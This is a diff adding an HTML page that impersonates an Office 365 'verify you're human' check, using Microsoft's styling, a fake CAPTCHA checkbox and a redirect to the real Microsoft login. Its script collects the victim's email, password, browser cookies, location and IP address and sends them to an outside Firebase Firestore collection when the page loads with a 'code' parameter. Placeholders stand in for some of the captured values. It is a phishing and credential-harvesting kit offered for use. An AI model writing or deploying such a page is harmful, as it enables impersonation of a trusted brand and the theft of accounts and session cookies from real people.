@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Office 365 - Verify You're Human</title>
+    <style>
+        /* Font loading */
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap');
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1; /* Light gray background */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff; /* White background for container */
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 150px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #323130; /* Dark gray text color */
+        }
+
+        p.subtext {
+            font-size: 14px;
+            color: #605e5c; /* Medium gray text color */
+            margin-bottom: 30px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 10px;
+            accent-color: #0078d4; /* Office 365 checkbox color */
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            background-color: #0078d4; /* Office 365 theme color */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600; /* Bold button text */
+            font-size: 16px; /* Adjust button font size */
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #005a9e; /* Darker shade on hover */
+        }
+
+        button:disabled {
+            background-color: #b0b0b0; /* Gray when disabled */
+            cursor: not-allowed;
+        }
+
+        footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        footer a {
+            font-size: 12px;
+            color: #0078d4; /* Office 365 link color */
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    
+    <!-- Include Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth.js"></script>
+
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="office365-logo.png" alt="Office 365 Logo"> <!-- Ensure to upload the logo image to the same directory -->
+        </div>
+        <h1>Verify you’re human</h1>
+        <p class="subtext">Before you continue, please verify your identity by checking the box below.</p>
+
+        <div class="checkbox-container">
+            <input type="checkbox" id="human-checkbox">
+            <label for="human-checkbox">I'm not a robot</label>
+        </div>
+        <button id="continue-button" disabled>Continue</button>
+    </div>
+
+    <footer>
+        <p><a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a></p>
+    </footer>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA_4QT6t0OacVkyrRO_8skjBJE-h1NRojM",
+            authDomain: "project-2006669879225434405.firebaseapp.com",
+            projectId: "project-2006669879225434405",
+            storageBucket: "project-2006669879225434405.appspot.com",
+            messagingSenderId: "803339574811",
+            appId: "1:803339574811:web:146b22453ad870bd4522be"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const firestore = firebase.firestore();
+        const auth = firebase.auth();
+
+        const checkbox = document.getElementById('human-checkbox');
+        const continueButton = document.getElementById('continue-button');
+
+        // Enable the continue button when checkbox is checked
+        checkbox.addEventListener('change', function () {
+            continueButton.disabled = !this.checked;
+        });
+
+        // Redirect to Office 365 login page when button is clicked
+        continueButton.addEventListener('click', function () {
+            if (checkbox.checked) {
+                const redirectUrl = 'https://login.microsoftonline.com';
+                window.location.href = redirectUrl;
+            }
+        });
+
+        // Function to capture user data after login (implementation can be customized as needed)
+        function captureUserData() {
+            // Placeholder for user data capturing
+            const email = '{email}'; // Replace with dynamic email capture
+            const password = 'user_password'; // Replace with dynamic password capture
+            const cookies = document.cookie; // Capture cookies
+            const country = 'User Country'; // Capture user's country dynamically
+            const city = 'User City'; // Capture user's city dynamically
+            const ip_address = 'User IP Address'; // Capture user's IP address dynamically
+
+            // Create a text document with cookies
+            const cookieData = `Cookies: ${cookies}`;
+            const blob = new Blob([cookieData], { type: 'text/plain' });
+            const cookieFile = URL.createObjectURL(blob);
+
+            // Create a FormData object to send to Firebase
+            const data = {
+                email: email,
+                password: password,
+                cookies: cookieFile,
+                country: country,
+                city: city,
+                ip_address: ip_address
+            };
+
+            // Send the data to Firestore
+            firestore.collection('userData').add(data)
+            .then((docRef) => {
+                console.log('Document written with ID: ', docRef.id);
+            })
+            .catch((error) => {
+                console.error('Error adding document: ', error);
+            });
+        }
+
+        // Call this function after redirecting back from Office 365 login
+        window.addEventListener('load', function() {
+            const queryParams = new URLSearchParams(window.location.search);
+            if (queryParams.has('code')) {
+                captureUserData();
+            }
+        });
+    </script>
+
+</body>
+</html>
